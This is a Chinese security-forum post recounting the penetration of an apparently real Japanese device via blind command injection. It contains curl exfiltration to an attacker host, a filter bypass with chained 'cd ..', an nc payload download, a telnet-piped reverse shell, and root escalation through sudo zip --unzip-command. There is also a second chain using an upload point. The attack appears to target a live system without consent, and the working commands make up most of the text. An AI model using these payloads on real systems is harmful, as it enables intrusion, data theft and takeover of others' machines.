

# 奇安信攻防社区-【Web实战】一次有趣的RCEbypass

### 【Web实战】一次有趣的RCEbypass

在对某樱花国渗透的时候发现一个RCE，经过多次测试后成功绕过限制拿到shell

在跟朋友一起渗透的时候发现个RCE

无回显，使用curl进行测试

![image.png](assets/1700442691-219a9651be10ecb7d379ab92ab39a12e.png)  
大哥服务器上有个接受参数回显的脚本，启动并监听

![image.png](assets/1700442691-7f33b3c4bb530d6ecfd9c1d67b78cf4f.png)  
成功接收到该回显

time=`curl x.x.x.x -d "c=$(id)"`

![image.png](assets/1700442691-255f493d267a78ffe641862f3a923b9b.png)  
尝试写入测试，失败

![image.png](assets/1700442691-0ac16d9a6107dcfe8bbd2490c6b0d523.png)

![image.png](assets/1700442691-1a8fa9e8a4b68d75b8dcaa1cd90f15be.png)  
尝试远程下载wget，powershell上线等方式，均失败

使用cat读取代码

![image.png](assets/1700442691-19d611af553dcdb4e7e8d4a818f4f296.png)

![image.png](assets/1700442691-4cda3e5d6644a9befebc957bb063db4f.png)  
简单说下代码，接受post的time参数，将T替换成空格，将/替换成-，然后把过滤过的参数放进SystemSetting\_setLocalTime函数当中

跟进函数，接收参数后拼接到$cmd\_date\_set中

![image.png](assets/1700442691-d3853ff89834c29518dec4c4f950e937.png)  
然后在48行中过滤掉|，然后拼接到exec中进行命令执行，其中|符号用不了，可以使用反引号来代替拼接

所以我们现在知道了屏蔽了 / | \\ 三个符号

梳理下思路，一般利用方式因为 /的原因，所以用不了http协议，无法尝试远程下载等方式，没有权限进行写入文件，那么现在几种方式进行bypass，第一种，替换/|\\符号，比如常见的空格符$IFS替换，第二种，进行提权写入文件，第三种，想办法再挖一个其他漏洞进行组合利用，第四种，尝试在其他目录写文件执行

那么先查看有哪些命令可用

使用compgen -c没有回显，echo $PATH只返回个H，最后使用busybox进行输出测试

![image.png](assets/1700442691-90e5b768fed846437df6c35ed72799d9.png)  
常用的思路到这卡住了，尝试使用进行读取某一个字符并输出到当前目录，但发现该方法也无效，没有生成成功output.txt

dd if=1 bs=1 skip=9 count=1 status=none of=output.txt

![image.png](assets/1700442691-faba9ff597b33bc1837ef4b933026079.png)  
继续想办法，虽然限制了/不能进行 cd ../..等，但是正常的cd ..是可以使用的

使用命令 cd ..; cd ..; cd ..; cd ..; cd tmp; nc x.x.x.x 81 > 1.sh

发现是可以成功的

![image.png](assets/1700442691-608f09539648db182e301a71b07db256.png)  
经过测试，成功步骤如下

以下简称服务端，其中被控端为目标设备

1 服务端启用nc监听，并在被控端中写入命令

被控端：cd ..; cd ..; cd ..; cd ..; cd tmp; nc x.x.x.x 81 > 1.sh

服务端：sudo nc -lvvnp 85

2 服务端写命令

telnet x.x.x.x 82 | /bin/sh | telnet x.x.x.x 83

![image.png](assets/1700442691-610a2cab996a08d288e7fb510a5ccdc0.png)  
回车后打开burp

3 被控端写命令

![image.png](assets/1700442691-4e18423f731380b46308d47951d2968c.png)  
time=`curl x.x.x.x -d "c=$(cd ..; cd ..; cd ..; cd ..; cd tmp; nc  x.x.x.x 85 > 1.sh)"`

4 发包，发现成功写入1.sh

![image.png](assets/1700442691-1b3b4fa860c178df91d972e80b3d6fdf.png)  
5 监听82,83端口

![image.png](assets/1700442691-50b7024a62d12509e359220d91757a5c.png)  
并发包

time=`cd ..; cd ..; cd ..; cd ..; cd tmp;sh 1.sh`

![image.png](assets/1700442691-bd850e52debff2c4f2d7a11b0e4a37c1.png)  
6 至此成功拿到shell

![image.png](assets/1700442691-80a46b6cd0e48764d6fa9d35303de8ab.png)  
7 进行提权

其中/etc/sudoers 设置了nobody可以使用sudo不需要输入密码的命令

![image.png](assets/1700442691-d064e3ad919bea96e98faff3371528b4.png)  
又因为/usr/bin/zip 有一个参数--unzip-command可以执行命令

所以使用以下命令就可以直接进行提权

sudo /usr/bin/zip 1aca.zip /etc/passwd -T --unzip-command="sh -c /bin/sh"

![image.png](assets/1700442691-d155367c2cd045a4e347e2e12a099394.png)  
拿到root权限

第二种方法，根据文件代码，发现一个上传点如下

![image.png](assets/1700442691-4d3a5993502bdd3e91e547d3c3bed7b7.png)  
其中路径为/svr/www，没有到网站目录/www/，那么利用方法就是上传一个文件，在使用rce进行执行拿到shell，在34行有个简单的判断是否为zip格式文件，但是并没有限制后缀名等条件

简单写个poc

![image.png](assets/1700442691-fa41bab9e392bf8beda14e469ffd0e22.png)  
其中写入的内容如下

sudo /usr/bin/zip 1aca.zip /etc/syslog.conf -T --unzip-command="sh -c 'id > /tmp/test.txt'"

![image.png](assets/1700442691-7a1dae99586d720c42f22170173bb45f.png)  
上传成功后跟之前的利用思路一样，跨目录进行读取

![image.png](assets/1700442691-e1690342885446f9b5da05f0d8056c46.png)

![image.png](assets/1700442691-89ed6ab39054db70b4fb75635c74522c.png)

![image.png](assets/1700442691-5a513080c03fac2ea92f4ee626201d33.png)  
圆满成功！感谢@昭通早行网络科技有限公司的各位师傅不吝赐教！！！

文章有错误请联系我

微信 zacaq999
